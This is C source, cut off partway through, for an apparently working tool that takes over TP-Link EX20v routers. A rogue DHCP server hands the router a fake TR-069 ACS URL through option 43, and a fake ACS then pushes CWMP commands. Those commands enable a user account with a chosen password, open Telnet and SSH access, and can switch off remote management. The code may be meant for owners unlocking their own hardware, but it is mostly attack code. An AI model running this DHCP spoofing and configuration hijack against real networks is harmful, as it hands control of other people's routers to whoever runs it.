/*
 * tp-unlink - enable root access on TP-Link EX20v via CWMP
 * spoofs DHCP option 43 to redirect router to fake ACS
 */

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <process.h>
#include <shlobj.h>
#include <io.h>
#include <fcntl.h>
#include <sys/stat.h>
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"iphlpapi.lib")
#pragma comment(lib,"shell32.lib")
#ifdef __STDC_NO_ATOMICS__
#define atomic_int volatile long
#define atomic_bool volatile long
#define atomic_store(p,v) InterlockedExchange(p,v)
#define atomic_load(p) InterlockedOr(p,0)
#define atomic_xchg(p,v) InterlockedExchange(p,v)
#else
#include <stdatomic.h>
#define atomic_xchg atomic_exchange
#endif
typedef SOCKET sock_t;
typedef HANDLE thrd_t;
#define close closesocket
#define THRD unsigned __stdcall
#define THRD_END return 0
#define BAD(s) ((s)==INVALID_SOCKET)
#define SENDFL 0
#define sockerr() WSAGetLastError()
#define EINTR_ WSAEINTR
#define EBUSY_ WSAEADDRINUSE
#define EAGAIN_ WSAETIMEDOUT
#else
#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <ifaddrs.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>
#ifdef __linux__
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <linux/filter.h>
#define SENDFL MSG_NOSIGNAL
#else
#include <net/if_dl.h>
#include <net/bpf.h>
#include <sys/wait.h>
#define SENDFL 0
#endif
typedef int sock_t;
typedef pthread_t thrd_t;
#define THRD void *
#define THRD_END return NULL
#define BAD(s) ((s)<0)
#define sockerr() errno
#define EINTR_ EINTR
#define EBUSY_ EADDRINUSE
#define EAGAIN_ EAGAIN
#define atomic_xchg atomic_exchange
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <signal.h>
#include <stdint.h>
#include <ctype.h>
#include <locale.h>

#define ARRLEN(a) (sizeof(a)/sizeof(*(a)))

static char g_srv[16] = "10.116.13.100";
static char g_cli[16] = "10.116.13.20";
static char g_pw[33], g_if[128], g_bak[256];
static int g_port = 7547, g_tmo = 30, g_slot = 2;
static int g_keep, g_verbose, g_dry, g_disable;
static atomic_int g_state;
static atomic_bool g_quit, g_portbusy;
static uint8_t g_mac[6];
static time_t g_start;

#ifdef _WIN32
#pragma pack(push,1)
#endif
struct dhcp_pkt {
    uint8_t op, htype, hlen, hops;
    uint32_t xid;
    uint16_t secs, flags;
    uint32_t ciaddr, yiaddr, siaddr, giaddr;
    uint8_t chaddr[16], sname[64], file[128];
    uint32_t cookie;
    uint8_t opts[312];
}
#ifndef _WIN32
__attribute__((packed))
#endif
;
#ifndef _WIN32
struct eth_ip_udp {
    uint8_t dst[6], src[6];
    uint16_t ethertype;
    uint8_t verhlen, tos;
    uint16_t totlen, id, fragoff;
    uint8_t ttl, proto;
    uint16_t hdrsum;
    uint32_t saddr, daddr;
    uint16_t sport, dport, udplen, udpsum;
} __attribute__((packed));
#endif
#ifdef _WIN32
#pragma pack(pop)
#endif

static const char SOAP_HDR[] =
    "<?xml version=\"1.0\"?>"
    "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" "
    "xmlns:soap=\"http://schemas.xmlsoap.org/soap/encoding/\" "
    "xmlns:cwmp=\"urn:dslforum-org:cwmp-1-0\" "
    "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
    "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">"
    "<soapenv:Header><cwmp:ID soapenv:mustUnderstand=\"1\">1</cwmp:ID></soapenv:Header>"
    "<soapenv:Body>";
static const char SOAP_HDR2[] =
    "<?xml version=\"1.0\"?>"
    "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" "
    "xmlns:soap=\"http://schemas.xmlsoap.org/soap/encoding/\" "
    "xmlns:cwmp=\"urn:dslforum-org:cwmp-1-0\">"
    "<soapenv:Header><cwmp:ID soapenv:mustUnderstand=\"1\">2</cwmp:ID></soapenv:Header>"
    "<soapenv:Body>";
static const char SOAP_FTR[] = "</soapenv:Body></soapenv:Envelope>";
static const char HTTP_204[] = "HTTP/1.1 204 No Content\r\n\r\n";

static void wipe(void *p, size_t n) {
#ifdef _WIN32
    SecureZeroMemory(p, n);
#elif defined(__GLIBC__) && __GLIBC__ >= 2
    explicit_bzero(p, n);
#else
    volatile char *q = p; while (n--) *q++ = 0;
#endif
}

static void logmsg(const char *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    printf("  "); vprintf(fmt, ap); putchar('\n');
    va_end(ap);
}

static void dbg(const char *fmt, ...) {
    if (!g_verbose) return;
    va_list ap; va_start(ap, fmt);
    fprintf(stderr, "  [dbg] "); vfprintf(stderr, fmt, ap); fputc('\n', stderr);
    va_end(ap);
}

static void slp(int ms) {
#ifdef _WIN32
    Sleep(ms);
#else
    struct timespec ts = {ms/1000, (ms%1000)*1000000L};
    nanosleep(&ts, NULL);
#endif
}

#ifndef _WIN32
static uint16_t ipcksum(const void *data, int len) {
    uint32_t sum = 0;
    const uint8_t *p = data;
    while (len > 1) { uint16_t w; memcpy(&w, p, 2); sum += w; p += 2; len -= 2; }
    if (len) sum += *p;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return ~sum;
}
#endif

static int waitfd(sock_t fd, int ms) {
    fd_set fds; FD_ZERO(&fds); FD_SET(fd, &fds);
    struct timeval tv = {ms/1000, (ms%1000)*1000};
    return select((int)fd+1, &fds, NULL, NULL, &tv);
}

static void chkip(const char *s) {
    struct sockaddr_in sa;
    if (!s || !*s || inet_pton(AF_INET, s, &sa.sin_addr) != 1) {
        logmsg("bad ip"); exit(1);
    }
    uint32_t a = ntohl(sa.sin_addr.s_addr);
    if (!a || a == 0xffffffff) { logmsg("bad ip"); exit(1); }
}

static int intarg(const char *s, int lo, int hi) {
    if (!s) return -1;
    char *end; long v = strtol(s, &end, 10);
    return (s == end || *end || v < lo || v > hi) ? -1 : (int)v;
}

static int xmlesc(const char *in, char *out, int max) {
    int n = 0;
    for (; *in; in++) {
        const char *esc = NULL;
        switch (*in) {
            case '&': esc = "&amp;"; break;
            case '<': esc = "&lt;"; break;
            case '>': esc = "&gt;"; break;
            case '"': esc = "&quot;"; break;
            case '\'': esc = "&apos;"; break;
        }
        if (esc) {
            int len = (int)strlen(esc);
            if (n + len >= max) return 0;
            memcpy(out + n, esc, len); n += len;
        } else {
            if (n + 1 >= max) return 0;
            out[n++] = *in;
        }
    }
    out[n] = 0;
    return 1;
}

static int safesend(sock_t s, const void *buf, int len) {
    const char *p = buf;
    while (len > 0) {
        int n = send(s, p, len, SENDFL);
        if (n <= 0) { if (sockerr() == EINTR_) continue; return 0; }
        p += n; len -= n;
    }
    return 1;
}

static int sendhttp(sock_t c, const char *body, int bodylen) {
    char hdr[256];
    int n = snprintf(hdr, sizeof hdr,
        "HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n", bodylen);
    return n > 0 && n < (int)sizeof hdr && safesend(c, hdr, n) && safesend(c, body, bodylen);
}

#ifdef _WIN32
static int optind = 1, optpos = 1;
static char *optarg;

static int getopt(int argc, char **argv, const char *optstr) {
    optarg = NULL;
    if (optind >= argc) return -1;
    char *arg = argv[optind];
    if (optpos == 1) {
        if (arg[0] != '-' || !arg[1]) return -1;
        if (arg[1] == '-' && !arg[2]) { optind++; return -1; }
    }
    char c = arg[optpos];
    const char *p = strchr(optstr, c);
    if (!p || c == ':') {
        if (arg[optpos+1]) optpos++; else { optind++; optpos = 1; }
        return '?';
    }
    if (p[1] == ':') {
        if (arg[optpos+1]) { optarg = arg + optpos + 1; optind++; optpos = 1; }
        else if (optind + 1 < argc) { optarg = argv[++optind]; optind++; optpos = 1; }
        else { optind++; optpos = 1; return '?'; }
    } else {
        if (arg[optpos+1]) optpos++; else { optind++; optpos = 1; }
    }
    return c;
}
#endif

static int dhcp_msgtype(struct dhcp_pkt *pkt) {
    uint8_t *end = pkt->opts + sizeof pkt->opts;
    for (uint8_t *p = pkt->opts; p < end && *p != 255; ) {
        if (*p == 0) { p++; continue; }
        if (p + 2 > end) break;
        int len = p[1];
        if (p + 2 + len > end) break;
        if (*p == 53) return p[2];
        p += 2 + len;
    }
    return 0;
}

static int build_dhcp_opts(uint8_t *opt) {
    uint8_t *p = opt;
    uint32_t srv, mask;
    inet_pton(AF_INET, g_srv, &srv);
    inet_pton(AF_INET, "255.255.255.0", &mask);
    uint32_t lease = htonl(86400);

    char acsurl[96];
    int urllen = snprintf(acsurl, sizeof acsurl, "http://%s:%d/simula", g_srv, g_port);

    *p++ = 54; *p++ = 4; memcpy(p, &srv, 4); p += 4;
    *p++ = 1;  *p++ = 4; memcpy(p, &mask, 4); p += 4;
    *p++ = 3;  *p++ = 4; memcpy(p, &srv, 4); p += 4;
    *p++ = 51; *p++ = 4; memcpy(p, &lease, 4); p += 4;
    *p++ = 43; *p++ = (uint8_t)(urllen + 2); *p++ = 1; *p++ = (uint8_t)urllen;
    memcpy(p, acsurl, urllen); p += urllen;
    *p++ = 255;

    return (int)(p - opt);
}

static THRD dhcp_thread(void *);
static THRD acs_thread(void *);

#ifdef _WIN32
static BOOL WINAPI sighandler(DWORD sig) { (void)sig; atomic_store(&g_quit, 1); return TRUE; }

static void platform_init(void) {
    WSADATA w; WSAStartup(MAKEWORD(2,2), &w);
    SetConsoleCtrlHandler(sighandler, TRUE);
}

static void platform_fini(void) {
    wipe(g_pw, sizeof g_pw);
    WSACleanup();
}

static void find_iface(void) {
    ULONG sz = 15000;
    IP_ADAPTER_ADDRESSES *addrs = malloc(sz);
    if (!addrs) return;
    if (GetAdaptersAddresses(AF_INET, 0, NULL, addrs, &sz) != NO_ERROR) {
        free(addrs); return;
    }
    for (IP_ADAPTER_ADDRESSES *p = addrs; p; p = p->Next) {
        if (p->IfType != 6 || p->OperStatus != 1) continue;
        wcstombs(g_if, p->FriendlyName, sizeof g_if - 1);
        memcpy(g_mac, p->PhysicalAddress, 6);
        break;
    }
    free(addrs);
}

static int check_iface(void) {
    ULONG sz = 15000;
    IP_ADAPTER_ADDRESSES *addrs = malloc(sz);
    if (!addrs) return 0;
    if (GetAdaptersAddresses(AF_INET, 0, NULL, addrs, &sz) != NO_ERROR) {
        free(addrs); return 0;
    }
    int found = 0;
    for (IP_ADAPTER_ADDRESSES *p = addrs; p; p = p->Next) {
        char name[128] = {0};
        wcstombs(name, p->FriendlyName, sizeof name - 1);
        if (!strcmp(name, g_if)) { found = 1; break; }
    }
    free(addrs);
    return found;
}

static void set_ip(void) {
    wchar_t cmd[512], wif[128];
    mbstowcs(wif, g_if, ARRLEN(wif) - 1);
    _snwprintf(cmd, ARRLEN(cmd) - 1,
        L"netsh interface ip set address \"%s\" static %hs 255.255.255.0", wif, g_srv);
    STARTUPINFOW si = {sizeof si};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    slp(2500);
}

static void restore_ip(void) {
    wchar_t cmd[512], wif[128];
    mbstowcs(wif, g_if, ARRLEN(wif) - 1);
    _snwprintf(cmd, ARRLEN(cmd) - 1,
        L"netsh interface ip set address \"%s\" dhcp", wif);
    STARTUPINFOW si = {sizeof si};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

static int start_dhcp(thrd_t *t) { *t = (HANDLE)_beginthreadex(NULL, 0, dhcp_thread, NULL, 0, NULL); return *t != 0; }
static int start_acs(thrd_t *t) { *t = (HANDLE)_beginthreadex(NULL, 0, acs_thread, NULL, 0, NULL); return *t != 0; }
static void wait_thread(thrd_t t) { WaitForSingleObject(t, 1000); CloseHandle(t); }

#else

static void sighandler(int sig) { (void)sig; atomic_store(&g_quit, 1); }

static void platform_init(void) {
    signal(SIGINT, sighandler);
    signal(SIGTERM, sighandler);
    signal(SIGPIPE, SIG_IGN);
}

static void platform_fini(void) {
    wipe(g_pw, sizeof g_pw);
}

static void find_iface(void) {
    struct ifaddrs *ifa, *p;
    if (getifaddrs(&ifa)) return;
    for (p = ifa; p; p = p->ifa_next) {
        if (!p->ifa_addr || (p->ifa_flags & IFF_LOOPBACK) || !(p->ifa_flags & IFF_UP))
            continue;
        const char *name = p->ifa_name;
        if (!strncmp(name, "docker", 6) || !strncmp(name, "br-", 3) || !strncmp(name, "veth", 4))
            continue;
#ifdef __linux__
        if (p->ifa_addr->sa_family == AF_PACKET) {
            strncpy(g_if, name, sizeof g_if - 1);
            break;
        }
#else
        if (p->ifa_addr->sa_family == AF_LINK) {
            struct sockaddr_dl *sdl = (struct sockaddr_dl *)p->ifa_addr;
            if (sdl->sdl_type == 6) {
                strncpy(g_if, name, sizeof g_if - 1);
                memcpy(g_mac, LLADDR(sdl), 6);
                break;
            }
        }
#endif
    }
    freeifaddrs(ifa);
#ifdef __linux__
    if (g_if[0]) {
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        if (fd >= 0) {
            struct ifreq ifr = {0};
            strncpy(ifr.ifr_name, g_if, sizeof ifr.ifr_name - 1);
            if (!ioctl(fd, SIOCGIFHWADDR, &ifr))
                memcpy(g_mac, ifr.ifr_hwaddr.sa_data, 6);
            close(fd);
        }
    }
#endif
}

static int check_iface(void) {
    struct ifaddrs *ifa, *p;
    if (getifaddrs(&ifa)) return 0;
    int found = 0;
    for (p = ifa; p; p = p->ifa_next) {
        if (p->ifa_name && !strcmp(p->ifa_name, g_if)) { found = 1; break; }
    }
    freeifaddrs(ifa);
    return found;
}

static void set_ip(void) {
#ifdef __linux__
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    struct ifreq ifr = {0};
    strncpy(ifr.ifr_name, g_if, sizeof ifr.ifr_name - 1);
    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    sin->sin_family = AF_INET;
    inet_pton(AF_INET, g_srv, &sin->sin_addr);
    ioctl(fd, SIOCSIFADDR, &ifr);
    inet_pton(AF_INET, "255.255.255.0", &sin->sin_addr);
    ioctl(fd, SIOCSIFNETMASK, &ifr);
    ioctl(fd, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    ioctl(fd, SIOCSIFFLAGS, &ifr);
    close(fd);
#elif defined(__APPLE__)
    pid_t pid = fork();
    if (pid == 0) {
        execl("/sbin/ifconfig", "ifconfig", g_if, "inet", g_srv,
              "netmask", "255.255.255.0", "up", (char *)NULL);
        _exit(1);
    }
    if (pid > 0) waitpid(pid, NULL, 0);
#endif
    slp(2500);
}

static void restore_ip(void) {
#ifdef __linux__
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    struct ifreq ifr = {0};
    strncpy(ifr.ifr_name, g_if, sizeof ifr.ifr_name - 1);
    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    sin->sin_family = AF_INET;
    ioctl(fd, SIOCSIFADDR, &ifr);
    close(fd);
#elif defined(__APPLE__)
    pid_t pid = fork();
    if (pid == 0) {
        int null = open("/dev/null", O_WRONLY);
        if (null >= 0) { dup2(null, 2); close(null); }
        execl("/sbin/ifconfig", "ifconfig", g_if, "delete", g_srv, (char *)NULL);
        _exit(1);
    }
    if (pid > 0) waitpid(pid, NULL, 0);
#endif
}

static int start_dhcp(thrd_t *t) { return pthread_create(t, NULL, dhcp_thread, NULL) == 0; }
static int start_acs(thrd_t *t) { return pthread_create(t, NULL, acs_thread, NULL) == 0; }
static void wait_thread(thrd_t t) { pthread_join(t, NULL); }
#endif

static void build_setparam(char *buf, int sz) {
    char pwesc[128];
    if (!xmlesc(g_pw, pwesc, sizeof pwesc)) { logmsg("pw escape fail"); exit(1); }
    const char *cwmpdis = g_keep ? "" :
        "<ParameterValueStruct><Name>InternetGatewayDevice.ManagementServer.EnableCWMP</Name>"
        "<Value xsi:type=\"xsd:boolean\">0</Value></ParameterValueStruct>";
    snprintf(buf, sz,
        "%s<cwmp:SetParameterValues><ParameterList soap:arrayType=\"cwmp:ParameterValueStruct[%d]\">"
        "<ParameterValueStruct><Name>InternetGatewayDevice.X_TTG.Users.User.%d.Enable</Name>"
        "<Value xsi:type=\"xsd:boolean\">1</Value></ParameterValueStruct>"
        "<ParameterValueStruct><Name>InternetGatewayDevice.X_TTG.Users.User.%d.Password</Name>"
        "<Value xsi:type=\"xsd:string\">%s</Value></ParameterValueStruct>"
        "<ParameterValueStruct><Name>InternetGatewayDevice.X_TTG.Users.User.%d.LocalAccessCapable</Name>"
        "<Value xsi:type=\"xsd:boolean\">1</Value></ParameterValueStruct>"
        "<ParameterValueStruct><Name>InternetGatewayDevice.X_TTG.Users.User.%d.Allowed_LA_Protocols</Name>"
        "<Value xsi:type=\"xsd:string\">HTTP,HTTPS,TELNET,SSH</Value></ParameterValueStruct>"
        "<ParameterValueStruct><Name>InternetGatewayDevice.X_TTG.CWMP.VisibilityLevel</Name>"
        "<Value xsi:type=\"xsd:unsignedInt\">1</Value></ParameterValueStruct>"
        "%s</ParameterList><ParameterKey>12345</ParameterKey></cwmp:SetParameterValues>%s",
        SOAP_HDR, g_keep ? 5 : 6, g_slot, g_slot, pwesc, g_slot, g_slot, cwmpdis, SOAP_FTR);
}

static void build_getparam(char *buf, int sz) {
    snprintf(buf, sz,
        "%s<cwmp:GetParameterValues><ParameterNames soap:arrayType=\"xsd:string[1]\">"
        "<string>InternetGatewayDevice.X_TTG.Users.User.%d.</string>"
        "</ParameterNames></cwmp:GetParameterValues>%s",
        SOAP_HDR2, g_slot, SOAP_FTR);
}

static void build_disable(char *buf, int sz) {
    snprintf(buf, sz,
        "%s<cwmp:SetParameterValues><ParameterList soap:arrayType=\"cwmp:ParameterValueStruct[1]\">"
        "<ParameterValueStruct><Name>InternetGatewayDevice.X_TTG.Users.User.%d.Enable</Name>"
        "<Value xsi:type=\"xsd:boolean\">0</Value></ParameterValueStruct>"
        "</ParameterList><ParameterKey>12345</ParameterKey></cwmp:SetParameterValues>%s",
        SOAP_HDR, g_slot, SOAP_FTR);
}

static int parse_enabled(const char *xml) {
    if (!xml) return -1;
    char needle[64];
    snprintf(needle, sizeof needle, "User.%d.Enable", g_slot);
    char *p = strstr(xml, needle);
    if (!p) return -1;
    p = strstr(p, "<Value");
    if (!p) return -1;
    p = strchr(p, '>');
    if (!p) return -1;
    p++;
    while (*p == ' ' || *p == '\t' || *p == '\n') p++;
    if (*p == '1' || !strncmp(p, "true", 4)) return 1;
    if (*p == '0' || !strncmp(p, "false", 5)) return 0;
    return -1;
}

static void save_backup(const char *xml) {
    if (!xml) return;
    if (!g_bak[0]) {
        time_t t = time(NULL);
        struct tm tm;
#ifdef _WIN32
        localtime_s(&tm, &t);
#else
        localtime_r(&t, &tm);
#endif
        snprintf(g_bak, sizeof g_bak, "backup_%04d%02d%02d_%02d%02d%02d.xml",
            tm.tm_year+1900, tm.tm_mon+1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
    }
    int fd = open(g_bak, O_WRONLY|O_CREAT|O_EXCL, 0600);
    if (fd < 0) return;
    FILE *fp = fdopen(fd, "w");
    if (fp) { fprintf(fp, "%s", xml); fclose(fp); logmsg("backup: %s", g_bak); }
    else close(fd);
}

#ifndef _WIN32
static int build_raw_dhcp(uint8_t *pkt, struct dhcp_pkt *req, uint8_t *dstmac, int type) {
    struct eth_ip_udp *hdr = (void *)pkt;
    struct dhcp_pkt *reply = (void *)(pkt + sizeof *hdr);

    memset(hdr, 0, sizeof *hdr);
    memcpy(hdr->dst, dstmac, 6);
    memcpy(hdr->src, g_mac, 6);
    hdr->ethertype = htons(0x0800);
    hdr->verhlen = 0x45;
    hdr->ttl = 64;
    hdr->proto = 17;
    inet_pton(AF_INET, g_srv, &hdr->saddr);
    hdr->daddr = 0xffffffff;
    hdr->sport = htons(67);
    hdr->dport = htons(68);

    memset(reply, 0, sizeof *reply);
    reply->op = 2;
    reply->htype = 1;
    reply->hlen = 6;
    reply->xid = req->xid;
    inet_pton(AF_INET, g_cli, &reply->yiaddr);
    inet_pton(AF_INET, g_srv, &reply->siaddr);
    memcpy(reply->chaddr, req->chaddr, 16);
    reply->cookie = htonl(0x63825363);
    reply->opts[0] = 53;
    reply->opts[1] = 1;
    reply->opts[2] = type;

    int optlen = 3 + build_dhcp_opts(reply->opts + 3);
    int dhcplen = 240 + optlen;

    hdr->totlen = htons(20 + 8 + dhcplen);
    hdr->udplen = htons(8 + dhcplen);
    hdr->hdrsum = ipcksum(&hdr->verhlen, 20);

    return sizeof *hdr + dhcplen;
}
#endif

#ifdef _WIN32
static THRD dhcp_thread(void *arg) {
    (void)arg;
    sock_t fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (BAD(fd)) THRD_END;

    int yes = 1;
    setsockopt(fd, SOL_SOCKET, SO_BROADCAST, (char *)&yes, sizeof yes);
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof yes);

    struct sockaddr_in bind_addr = {0};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(67);
    bind_addr.sin_addr.s_addr = INADDR_ANY;

    for (int i = 0; i < 5; i++) {
        if (bind(fd, (void *)&bind_addr, sizeof bind_addr) == 0) goto bound;
        int e = WSAGetLastError();
        if (e == EBUSY_) { atomic_store(&g_portbusy, 1); break; }
        slp(1000);
    }
    close(fd);
    THRD_END;

bound:;
    struct sockaddr_in bcast = {0};
    bcast.sin_family = AF_INET;
    bcast.sin_port = htons(68);
    bcast.sin_addr.s_addr = 0xffffffff;

    uint8_t buf[4096];
    struct dhcp_pkt reply;

    while (!atomic_load(&g_quit)) {
        if (waitfd(fd, 200) <= 0) continue;
        struct sockaddr_in from;
        int fromlen = sizeof from;
        int n = recvfrom(fd, (char *)buf, sizeof buf, 0, (void *)&from, &fromlen);
        if (n < 240) continue;

        struct dhcp_pkt req;
        memcpy(&req, buf, sizeof req);
        if (ntohl(req.cookie) != 0x63825363) continue;

        int type = dhcp_msgtype(&req);
        if (type != 1 && type != 3) continue;

        memset(&reply, 0, sizeof reply);
        reply.op = 2;
        reply.htype = 1;
        reply.hlen = 6;
        reply.xid = req.xid;
        inet_pton(AF_INET, g_cli, &reply.yiaddr);
        inet_pton(AF_INET, g_srv, &reply.siaddr);
        memcpy(reply.chaddr, req.chaddr, 16);
        reply.cookie = htonl(0x63825363);
        reply.opts[0] = 53;
        reply.opts[1] = 1;
        reply.opts[2] = (type == 1) ? 2 : 5;
        build_dhcp_opts(reply.opts + 3);

        if (!atomic_load(&g_quit))
            sendto(fd, (char *)&reply, sizeof reply, 0, (void *)&bcast, sizeof bcast);
    }
    close(fd);
    THRD_END;
}

#else

#ifdef __linux__
static sock_t open_raw(int *ifindex) {
    sock_t fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;

    struct ifreq ifr = {0};
    strncpy(ifr.ifr_name, g_if, sizeof ifr.ifr_name - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    *ifindex = ifr.ifr_ifindex;

    struct sockaddr_ll sll = {0};
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = *ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (void *)&sll, sizeof sll) < 0) {
        if (errno == EBUSY_) atomic_store(&g_portbusy, 1);
        close(fd);
        return -1;
    }

    struct sock_filter bpf[] = {
        BPF_STMT(BPF_LD+BPF_H+BPF_ABS, 12),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0x8100, 0, 1),
        BPF_STMT(BPF_RET+BPF_K, 0xffff),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0x0800, 0, 3),
        BPF_STMT(BPF_LD+BPF_B+BPF_ABS, 23),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 17, 0, 1),
        BPF_STMT(BPF_RET+BPF_K, 0xffff),
        BPF_STMT(BPF_RET+BPF_K, 0),
    };
    struct sock_fprog prog = { ARRLEN(bpf), bpf };
    setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof prog);
    return fd;
}
#else
static sock_t open_raw(int *ifindex) {
    (void)ifindex;
    char dev[16];
    sock_t fd = -1;
    for (int i = 0; i < 64; i++) {
        snprintf(dev, sizeof dev, "/dev/bpf%d", i);
        fd = open(dev, O_RDWR);
        if (fd >= 0) break;
    }
    if (fd < 0) return -1;

    struct ifreq ifr = {0};
    strncpy(ifr.ifr_name, g_if, sizeof ifr.ifr_name - 1);
    if (ioctl(fd, BIOCSETIF, &ifr) < 0) { close(fd); return -1; }

    int yes = 1;
    ioctl(fd, BIOCIMMEDIATE, &yes);
    ioctl(fd, BIOCSHDRCMPLT, &yes);

    struct bpf_insn filt[] = {
        BPF_STMT(BPF_LD+BPF_H+BPF_ABS, 12),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0x8100, 0, 1),
        BPF_STMT(BPF_RET+BPF_K, (u_int)-1),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 0x0800, 0, 8),
        BPF_STMT(BPF_LD+BPF_B+BPF_ABS, 23),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 17, 0, 6),
        BPF_STMT(BPF_LD+BPF_H+BPF_ABS, 20),
        BPF_JUMP(BPF_JMP+BPF_JSET+BPF_K, 0x1fff, 4, 0),
        BPF_STMT(BPF_LD+BPF_H+BPF_ABS, 36),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, 67, 0, 2),
        BPF_STMT(BPF_RET+BPF_K, (u_int)-1),
        BPF_STMT(BPF_RET+BPF_K, 0),
    };
    struct bpf_program prog = { ARRLEN(filt), filt };
    ioctl(fd, BIOCSETF, &prog);

    struct timeval tv = {0, 200000};
    ioctl(fd, BIOCSRTIMEOUT, &tv);
    return fd;
}
#endif

static THRD dhcp_thread(void *arg) {
    (void)arg;
    int ifindex = 0;
    sock_t fd = open_raw(&ifindex);
    if (BAD(fd)) { dbg("raw socket failed"); THRD_END; }

#ifdef __linux__
    struct sockaddr_ll sll = {0};
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifindex;
#endif

    uint8_t buf[4096], pkt[4096];

    while (!atomic_load(&g_quit)) {
#ifdef __linux__
        if (waitfd(fd, 200) <= 0) continue;
        ssize_t n = recv(fd, buf, sizeof buf, 0);
#else
        ssize_t n = read(fd, buf, sizeof buf);
#endif
        if (n < 0) {
            int e = sockerr();
            if (e == EINTR_ || e == EAGAIN_) continue;
            break;
        }
        if (n < (ssize_t)(sizeof(struct eth_ip_udp) + 240)) continue;

        struct eth_ip_udp *hdr = (void *)buf;

        if (ntohs(hdr->ethertype) == 0x8100) {
            uint16_t tci;
            memcpy(&tci, buf + 14, 2);
            logmsg("VLAN %d detected", ntohs(tci) & 0xfff);
            atomic_store(&g_state, 4);
            atomic_store(&g_quit, 1);
            continue;
        }

        if (ntohs(hdr->ethertype) != 0x0800) continue;

#ifdef __linux__
        unsigned ihl = (buf[14] & 0xf) * 4;
        if (ihl < 20 || ihl > 60 || n < 14 + (ssize_t)ihl) continue;
        if (ipcksum(buf + 14, ihl)) continue;
#endif

        struct dhcp_pkt *req = (void *)(buf + sizeof *hdr);
        if (hdr->proto != 17 || ntohs(hdr->dport) != 67) continue;
        if (ntohl(req->cookie) != 0x63825363) continue;

        int type = dhcp_msgtype(req);
        if (type != 1 && type != 3) continue;

        dbg("dhcp %s", type == 1 ? "discover" : "request");

        int len = build_raw_dhcp(pkt, req, hdr->src, type == 1 ? 2 : 5);
        if (len > 0 && !atomic_load(&g_quit)) {
#ifdef __linux__
            sendto(fd, pkt, len, SENDFL, (void *)&sll, sizeof sll);
#else
            write(fd, pkt, len);
#endif
        }
    }
    close(fd);
    THRD_END;
}
#endif

static THRD acs_thread(void *arg) {
    (void)arg;
    sock_t fd = socket(AF_INET, SOCK_STREAM, 0);
    if (BAD(fd)) THRD_END;

    int yes = 1;
#ifdef SO_REUSEPORT
    setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &yes, sizeof yes);
#else
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, (void *)&yes, sizeof yes);
#endif

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(g_port);

    if (bind(fd, (void *)&addr, sizeof addr) < 0) {
        if (sockerr() == EBUSY_) atomic_store(&g_portbusy, 1);
        close(fd);
        THRD_END;
    }
    listen(fd, 4);

    char payload[8192], getparam[1024];
    if (g_disable) build_disable(payload, sizeof payload);
    else build_setparam(payload, sizeof payload);
    build_getparam(getparam, sizeof getparam);

    int step = 0;
    time_t step_time = time(NULL);

    while (!atomic_load(&g_quit)) {
